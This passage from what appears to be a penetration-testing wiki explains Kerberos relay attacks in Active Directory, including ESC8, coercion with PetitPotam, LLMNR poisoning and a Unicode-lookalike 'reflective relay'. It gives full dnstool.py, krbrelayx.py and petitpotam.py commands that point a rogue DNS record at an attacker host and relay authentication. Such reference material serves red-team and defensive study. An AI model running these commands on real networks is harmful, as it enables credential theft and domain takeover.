...
An interesting service for relaying authentications is the AD CS HTTP service, which by default is vulnerable to relay attacks as it does not enforce signing with HTTP, allowing an [ESC8](/ad/movement/ad-cs/unsigned-endpoints#web-endpoint-esc8) to be exploited via Kerberos from a [mitm6 DNS poisoning](/ad/movement/mitm-and-coerced-authentications/dhcpv6-spoofing).
...
* The HTTP/S services [from AD CS](/ad/movement/ad-cs/unsigned-endpoints#web-endpoint-esc8) and [SCCM](/ad/movement/sccm-mecm/credential-harvesting) can be very good targets as HTTP does not expect a request for a signature.
...
As demonstrated by Synacktiv in [this blog post](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx), it is also possible to relay a Kerberos authentication from, and to, unsigned SMB services, when it comes [from a coercion](/ad/movement/mitm-and-coerced-authentications).
...
2. Then, trigger an authentication coerce (for example, with [PetitPotam](/ad/movement/mitm-and-coerced-authentications/ms-efsr)) from the target to the DNS record, and relay the authentication with [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python). For example, here to the [PKI HTTP endpoint](/ad/movement/ad-cs/unsigned-endpoints#web-endpoint-esc8):
...
In the case where the target of the relay (**the machine receiving the relay**) is an unsigned SMB service, and the authentication obtained is privileged, the following command will [dump the SAM and the LSA secrets](/redteam/credentials/os-credentials/windows-and-active-directory/sam-and-lsa-secrets):
...
1. Set up an [LLMNR poisoner](/ad/movement/mitm-and-coerced-authentications/llmnr-nbtns-mdns-spoofing), for example with [Responder](https://github.com/lgandx/Responder) (Python).
...
This attack can also work by forcing [a WebDAV authentication](/ad/movement/mitm-and-coerced-authentications/webclient) to a record that does not exist. The absence of a DNS record will generate an LLMNR fallback, leading to the same result.

### Reflective relay (CVE-2025-58726 / CVE-2026-26128)

A 2026 technique (patched March 2026) abuses Unicode normalization inconsistencies between Windows components to relay a machine's own Kerberos authentication back to itself. A DNS record is spoofed with lookalike Unicode characters (e.g. `SⓇV1․AD․LOCAL`, with `Ⓡ` = U+24C7 and `․` = U+2024): the DC's LDAP normalizes it (`LCMapStringEx` with `NORM_IGNORECASE | NORM_IGNORENONSPACE | NORM_IGNOREWIDTH`) to the target machine's SPN, while the `DnsCache` service (`CompareStringW`, `NORM_IGNORECASE` only) does not treat it as localhost, so the name resolves toward the attacker.

```bash
# 1. Register the lookalike DNS record pointing at the attacker
dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" "$DC_IP" --action add -r "<TARGET_NETBIOS_UNICODE>.<DOMAIN_UNICODE>" -d "$ATTACKER_IP"

# 2. Relay the coerced Kerberos authentication back to the target
krbrelayx.py -t smb://"$TARGET_FQDN"
petitpotam.py -u "$USER" -p "$PASSWORD" -d "$DOMAIN" "<TARGET_NETBIOS_UNICODE>.<DOMAIN_UNICODE>" "$TARGET_FQDN"

# 3. Clean up the rogue record
dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" "$DC_IP" --action remove -r "<TARGET_NETBIOS_UNICODE>.<DOMAIN_UNICODE>" --tcp
```

<Callout type="warn">

The modified `krbrelayx.py` required for this attack was not public at the time of writing (June 2026); watch Synacktiv's publications and the krbrelayx repository. Even after the March 2026 patches, services without channel binding stay exposed (AD CS Web Enrollment, SCCM AdminService, MSSQL). Always remove the rogue DNS record afterwards.
